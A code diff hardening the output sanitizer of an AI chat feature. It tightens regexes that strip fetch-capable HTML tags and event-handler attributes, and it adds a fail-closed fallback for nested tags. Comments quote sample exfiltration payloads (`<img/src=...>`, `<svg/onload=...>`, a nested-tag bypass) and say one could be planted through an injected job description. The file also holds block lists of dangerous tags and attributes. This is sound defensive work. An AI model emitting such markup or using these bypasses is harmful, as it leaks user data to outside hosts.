@@ -482,21 +482,55 @@ CHAT_MAX_OUTPUT_TOKENS = 1024
 # `<table background=...>`/`<frame src=...>`/`<portal src=...>` are all
 # fetch-capable — and (b) EVENT HANDLERS on an otherwise inert tag, e.g.
 # `<div onmouseover="fetch(...)">`, where nothing about the tag NAME is
-# dangerous. Rather than chase an ever-growing name+attribute list, the
-# second alternative below strips ANY tag that carries an attribute
-# assignment (`<name ...=...>`), regardless of name. None of the fidelity
-# cases above have an `=` inside their angle brackets, so this leaves them
-# untouched while killing `<image src=>`, `<div onmouseover=>`,
-# `<body background=>`, `<table background=>`, etc. in one move.
+# dangerous. The second alternative below therefore also strips tags whose
+# NAME is not on the list, but only in the two shapes a real HTML tag
+# actually takes (see _HTML_TAG_RE for exactly which).
+#
+# BOTH alternatives accept `[\s/]` — not just `\s` — after the tag name.
+# HTML5's tokenizer treats "/" inside a tag as an attribute separator, so
+# `<img/src=x>` IS `<img src=x>` to every browser (confirmed against
+# html.parser: tag='img' attrs=[('src', 'x')]). Requiring whitespace there
+# let `<img/src="//host/p?d=...">`, `<svg/onload=...>`, `<div/onmouseover=...>`
+# and friends walk straight through both branches.
 _DANGEROUS_TAG_NAMES = (
     'img', 'script', 'iframe', 'object', 'embed', 'source', 'video', 'audio',
     'link', 'a', 'form', 'input', 'svg', 'style', 'base', 'meta', 'track',
     'picture', 'image', 'body', 'frame', 'frameset', 'portal', 'button',
     'use',
 )
+# Attributes that can fetch, navigate, or execute. Used by the unlisted-name
+# branch so `<div onmouseover=...>`/`<table background=...>` still die even
+# when the assignment is not the tag's FIRST attribute (`<div hidden
+# onclick=...>`) or is spaced out (`<div onmouseover = ...>`), both of which
+# are legal HTML the first-attribute shape alone would miss. `on[a-zA-Z]{3,}`
+# needs >=5 characters total, so ordinary prose words that merely start with
+# "on" (`one=1`) can never masquerade as a handler.
+_DANGEROUS_ATTR_NAMES = (
+    r'on[a-zA-Z]{3,}', 'xlink:href', 'formaction', 'background', 'longdesc',
+    'manifest', 'codebase', 'archive', 'srcset', 'usemap', 'poster', 'action',
+    'dynsrc', 'lowsrc', 'style', 'href', 'data', 'cite', 'ping', 'src',
+)
+# The unlisted-name branch used to be `<name\s[^<>]*=[^<>]*/?>` — "any tag
+# with an `=` anywhere between the brackets". That over-matched badly, because
+# generic DEFAULT PARAMETERS are exactly that shape: `template <typename T =
+# int>`, `template<int N = 4>`, `f<T = string>`, `struct Foo<T = u32>` all
+# lost their type parameter, and since `[^<>]*` matches newlines, one stray
+# `<word ` could swallow an unbounded MULTI-LINE span up to the next `>` if an
+# `=` happened to fall in between (`Use a<b for the check\nand set flag=1 when
+# done\nso that c>d.` -> `Use ad.`). It is now constrained three ways:
+#   * no newlines in the body, so a match can never span lines;
+#   * shape 1 — the first attribute carries the `=` IMMEDIATELY, with no
+#     space before it (`<div onmouseover=`, `<table background=`). Every
+#     generic-default case has ` = ` (spaced) or a non-attribute first token
+#     (`<typename T = int>` starts with `T `), so none of them match;
+#   * shape 2 — an assignment anywhere in the tag whose attribute NAME is on
+#     _DANGEROUS_ATTR_NAMES. `T`/`N`/`z`/`flag` are not, so the fidelity cases
+#     stay out; `onmouseover`/`background`/`src` are, so real payloads stay in.
 _HTML_TAG_RE = re.compile(
-    r'</?(?:' + '|'.join(_DANGEROUS_TAG_NAMES) + r')(?:\s[^<>]*)?/?>' +
-    r'|<[a-zA-Z][a-zA-Z0-9]*\s[^<>]*=[^<>]*/?>',
+    r'</?(?:' + '|'.join(_DANGEROUS_TAG_NAMES) + r')(?:[\s/][^<>]*)?/?>'
+    r'|<[a-zA-Z][a-zA-Z0-9]*[\s/]+'
+    r'(?:[^\s<>=/]+=|(?:[^<>\n]*?[\s/])?(?:' +
+    '|'.join(_DANGEROUS_ATTR_NAMES) + r')[ \t]*=)[^<>\n]*>',
     re.IGNORECASE)
 # A single .sub() pass can leave a dangerous tag half-assembled:
 # "<scr<img src=x>ipt>" loses the inner <img ...> tag in one pass, which
@@ -505,6 +539,9 @@ _HTML_TAG_RE = re.compile(
 # output. Bounded (real payloads converge in 2-3 passes; this stops a
 # pathological input from spinning forever).
 _MAX_TAG_STRIP_PASSES = 10
+# Fail-closed backstop for when that bound is hit. No name list, no attribute
+# shape — every remaining `<...>` goes. See _strip_dangerous_tags.
+_ANY_TAG_RE = re.compile(r'<[^<>]*>')
 _MD_IMAGE_RE = re.compile(r'!\[[^\]]*\]\([^)]*\)')
 _MD_LINK_RE = re.compile(r'\[([^\]]*)\]\([^)]*\)')
 # ANY scheme, not an enumerated list: `ws://`, `file://`, `blah://` are just
@@ -544,13 +581,34 @@ def _strip_dangerous_tags(text):
 
     See _MAX_TAG_STRIP_PASSES above: a single pass can remove an inner tag
     and thereby assemble an outer one that was never itself matched.
+
+    The pass bound must FAIL CLOSED. Nesting depth n needs n+1 passes, so
+    returning the partially-stripped text once the bound is hit hands the
+    client back a live tag: a ~330-character `<i<i<i...<img src="//host/p">
+    mg src="//host/p">...>` payload — trivially inside a 1024-token reply and
+    fully specifiable from an injected job description — converged at depth 9
+    but leaked an intact `<img src="//host/p">` at depth 10. When residue is
+    still tag-shaped after the bound, every remaining `<...>` is removed
+    instead, with no name or attribute conditions at all. That loop is
+    unbounded but provably terminating: it only re-runs when the string
+    changed, and _ANY_TAG_RE only ever shortens it. At its fixed point no
+    `<...>` without an inner angle bracket exists, so no complete tag of any
+    kind can remain.
     """
     for _ in range(_MAX_TAG_STRIP_PASSES):
         stripped = _HTML_TAG_RE.sub('', text)
         if stripped == text:
             return stripped
         text = stripped
-    return text
+    if not _HTML_TAG_RE.search(text):
+        return text
+    logger.warning('ai chat sanitizer hit the tag-strip pass bound; '
+                   'falling back to removing all residual markup')
+    while True:
+        stripped = _ANY_TAG_RE.sub('', text)
+        if stripped == text:
+            return stripped
+        text = stripped
 
 
 def _sanitize_reply(text):
